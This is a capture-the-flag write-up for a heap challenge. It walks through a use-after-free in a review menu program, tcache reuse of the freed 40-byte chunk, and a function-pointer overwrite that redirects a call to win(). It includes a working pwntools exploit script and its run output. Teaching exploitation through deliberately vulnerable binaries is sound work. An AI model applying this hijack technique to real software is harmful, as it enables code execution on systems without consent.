# One Last Review - writeup (heap UAF, tcache reuse, indirect call to win)

## Getting to know the task

The archive gives two files:

- `chall.c` - the full C source of the program
- `chall` - the compiled binary (ELF64, not PIE, not stripped)

The program is an interactive console menu "leave a review" with 6 options:

```text
1. Submit a review
2. Mark review as favourite
3. Delete review
4. Write a draft
5. Preview favourite review
6. Leave
```

## Why the goal is `win()` (and how I found it)

The source is in the archive, so the very first step is to read it and find where the flag can possibly be printed. In `chall.c` there is exactly one place that opens `flag.txt` - the function `win()`:

```c
__attribute__((used, noinline))
void win(review_t *unused)
{
    char flag[256];
    FILE *file;

    file = fopen("flag.txt", "r");
    if (file == NULL) { puts("The prize envelope is missing..."); exit(1); }
    ...
    printf("Five stars! Here is your prize:\n%s", flag);
    exit(0);
}
```

It reads `flag.txt` and prints it. Nothing else in the program touches `flag.txt`. That is where the goal comes from: the only way to get the flag is to make the program execute `win()`.

`win()` exists in the code and is marked `__attribute__((used, noinline))` so the compiler does not strip it. But nothing in the menu calls it - so we need to hijack some indirect call and redirect it to `win`.

## Why the review struct is the key structure

Reading on, the interesting type is the review:

```c
#define REVIEW_TEXT_SIZE 32

struct review {
    char text[REVIEW_TEXT_SIZE];   // offset 0x00, 32 bytes
    void (*display)(review_t *review);  // offset 0x20, a function pointer
};
```

In memory a review is 40 bytes: 32 bytes of text + 8 bytes of a function pointer.

Why this struct is the key to the flag: it contains a **function pointer** (`display`), and the menu calls it indirectly (`preview_favourite` -> `favourite->display(favourite)`). A function pointer is a value the program later jumps through. If we can replace that value with the address of `win`, the next time the menu calls `display` it will run `win` instead - and print the flag. So this struct gives us the exact "what to overwrite" answer.

## What a chunk is (plain definition)

A **chunk** is the piece of memory that `malloc` returns. When the program calls `malloc(40)`, the allocator carves out a chunk from the heap: a small header (size, flags) plus 40 bytes of user data that the program actually uses. When the program calls `free(ptr)`, the chunk is returned to the allocator: its user data may be reused for bookkeeping (for example the freed chunk is linked into a bucket called tcache), but the memory itself stays in the heap.

The practical rule for this challenge: `malloc(40)` and `free(ptr)` deal in whole chunks, and a freed chunk of a given size is reused by the next `malloc` of the same size. `draft_t` is exactly `sizeof(review_t)` (40 bytes), so a freed review chunk and a new draft chunk are the same chunk.

## The bug: delete_review leaves a dangling pointer

Looking at the delete function:

```c
static void delete_review(void)
{
    if (review == NULL) { puts("There is no review to delete."); return; }

    free(review);
    review = NULL;
    puts("Review deleted.");
}
```

The chunk is freed and `review` is nulled, but the global pointer `favourite` is **not touched** here. If the review was marked as favourite, `favourite` still points to the freed chunk.

That is a **use-after-free (UAF)**: a pointer that continues to reference memory after it was freed. This is a well-known class of vulnerability (CWE-416 "Use After Free", see https://cwe.mitre.org/data/definitions/416.html): the freed memory can be reallocated and filled with attacker-controlled data, and any later use through the stale pointer then operates on that data. "Classic" here means it is the standard textbook scenario from that CWE description - free an object, keep a pointer to it, reuse the memory, trigger the stale pointer.

## The path to exploit it: write_draft reuses the chunk

`write_draft` shows how to use the dangling pointer:

```c
static void write_draft(void)
{
    long length;
    ...
    printf("Draft length (1-%zu): ", sizeof(draft->contents));
    length = read_number();
    if (length < 1 || (size_t)length > sizeof(draft->contents)) { ... }

    draft = malloc(sizeof(*draft));   // sizeof(draft_t) == sizeof(review_t) == 40
    ...
    memset(draft->contents, 0, sizeof(draft->contents));
    printf("Send exactly %ld draft bytes: ", length);
    read_exact(draft->contents, (size_t)length);
    ...
}
```

The draft is a struct `draft_t` whose size equals `review_t` (40 bytes) and which is entirely user-controlled data (the `contents` buffer). We choose `length` from 1 to 40, i.e. we can write **any 40 bytes**.

And the preview function is the trigger:

```c
static void preview_favourite(void)
{
    if (favourite == NULL) { ... }

    favourite->display(favourite);   // an indirect call through a pointer
}
```

It calls the `display` field of the struct `favourite` points at.

## The attack plan (step by step, why each step gets us closer to the flag)

1. **`submit_review` - create the object we will later control.** It allocates a 40-byte chunk on the heap, fills `text`, sets `display = show_review`. Why this step: this is the chunk whose lifetime we will abuse; without a real review, nothing else in the plan works (the menu refuses to delete an empty review).

2. **`mark_favourite` - save a second pointer to the same object.** `favourite = review`. Why this step: now two globals point at the same chunk. After we free it, `review` gets nulled but `favourite` does not - `favourite` will be the stale pointer we trigger later.

3. **`delete_review` - free the chunk, keep the stale pointer.** `free(review)`, `review = NULL`. Why this step: the chunk enters the tcache (a bucket of freed chunks of size 40), and crucially `favourite` still points at it. Now we have the UAF primitive: a live pointer to freed memory.

4. **`write_draft` - reallocate the same chunk.** `malloc(40)` returns exactly the freed chunk from step 3 (same size, tcache reuses it first-in-first-out). Why this step: `draft` now aliases the memory `favourite` points at, so whatever we write into the draft is what `favourite` "sees".

5. **`read_exact` - write our payload into that memory.** We send 32 filler bytes + `p64(addr_of_win)` (the 40 bytes land at offset 0x20, which is the `display` field). Why this step: this is the overwrite itself - we just replaced the function pointer. The struct now looks like a review whose `display` is `win`.

6. **`preview_favourite` - trigger the hijacked indirect call.** It runs `favourite->display(favourite)`, and `display` is now the address of `win` (not `show_review`). Why this step: this is the moment the program jumps into `win`, which opens `flag.txt` and prints it. The flag appears in the connection output.

## Why the address of win is a fixed constant (PIE vs EXEC)

- **PIE** (Position Independent Executable): the binary is loaded at a random base address on every run (ASLR), so function addresses change each time; to call one, you first need a leak of the base.
- **EXEC** (the type shown by `readelf -h` for a non-PIE ELF): the binary has a fixed load address, so every function address is a constant.

Our `chall` is type EXEC (not PIE), so the address of `win` is static. I take it from the symbol table:

```bash
$ nm chall | grep win
000000000040135f T win
```

## The exploit (scripts/solve.py)

```python
WIN = 0x40135F  # win() - static address, the binary is non-PIE
...
def run_exploit(r):
    payload = b"A" * 32 + p64(WIN)  # text[32] + display = win

    r.sendlineafter(b"> ", b"1")                          # submit a review
    r.sendlineafter(b"Review: ", b"Hello")                # review text
    r.sendlineafter(b"> ", b"2")                          # mark favourite: favourite = review
    r.sendlineafter(b"> ", b"3")                          # delete review: free(review), favourite dangles
    r.sendlineafter(b"> ", b"4")                          # write draft: malloc(40) reuses the freed chunk
    r.sendlineafter(b"Draft length (1-40): ", b"40")
    r.sendafter(b"Send exactly 40 draft bytes: ", payload)
    r.sendlineafter(b"> ", b"5")                          # preview favourite: calls display() = win()

    r.recvuntil(b"Five stars! Here is your prize:\n")
    return r.recvline().decode(errors="replace").strip()
```

Small details:

- On the instance the connection is wrapped in TLS (`ncat --ssl`), so pwntools needs `ssl=True` - without it the connection drops immediately.
- The draft length is sent with `sendlineafter` (the menu reads it with `strtol` from a line), while the 40 bytes are sent with `sendafter`: `read_exact` reads exactly 40 bytes, and a trailing newline would stay in the buffer and cause a harmless `Invalid choice.` before option 5.
- The payload contains null bytes (`p64(0x40135f)`), so it has to be sent as bytes, not as a "string".

## Verification, locally first

```bash
$ python3 scripts/solve.py --local
[*] local run, workdir /tmp/one_last_review_su91cyc9
FLAG: FortID{LOCAL_TEST_ONLY}
```

The script copies the binary into a temp dir and creates a `flag.txt` next to it with a dummy flag, so `assets/` stays clean. Locally it works on the first try.

## Remote

```bash
$ python3 scripts/solve.py baby-pwn-<INSTANCE>.inst14.ctf.fortid.com 1337
...
FLAG: FortID{W0ah_...}   (masked)
```

## Dead ends (what I considered and rejected)

1. **Overwriting the GOT.** Not needed and not easier: the indirect call in `preview_favourite` is a direct function-pointer call on a struct we fully control - no GOT involved.
2. **Stack overflow / format string.** None present in the source; the only function-pointer call is the review's `display`.
3. **Retrieving a libc leak first.** Unnecessary: `win` is in the binary itself at a fixed address, and the binary is not PIE. No libc base needed.

## One-paragraph version

One Last Review is a baby-heap challenge. The source shows that the flag is printed only by `win()`, which nothing in the menu calls. The review struct (40 bytes) ends with a `display` function pointer, and `preview_favourite` calls it indirectly. `delete_review` frees the review chunk but leaves the global `favourite` pointing at it (a UAF, CWE-416). `write_draft` allocates the same 40-byte size, the tcache reuses the freed chunk, and we fill it with 32 filler bytes plus the static address of `win` (0x40135f, the binary is type EXEC, not PIE). The next `preview_favourite` calls `display`, which is now `win` - the flag is printed.

## Lessons learned

1. A freed object with a live alias pointer (UAF) is only useful if you can re-fill the freed chunk with controlled data of the same size.
2. Function pointers in structs are the most direct hijack target: replace the pointer, and any later indirect call through it becomes arbitrary code execution.
3. A non-PIE binary (type EXEC) makes a "win" function a fixed constant - no leak needed, just `nm` and pack the address.
4. Read the source for allocation sizes: `draft_t` being the same size as `review_t` is exactly what turns "freed chunk" into "reused chunk".

## Files

- `assets/chall.c` - the challenge source (as shipped)
- `assets/chall` - the binary (ELF64, not PIE, not stripped)
- `scripts/solve.py` - the exploit: `python3 solve.py <host> [port]` or `--local`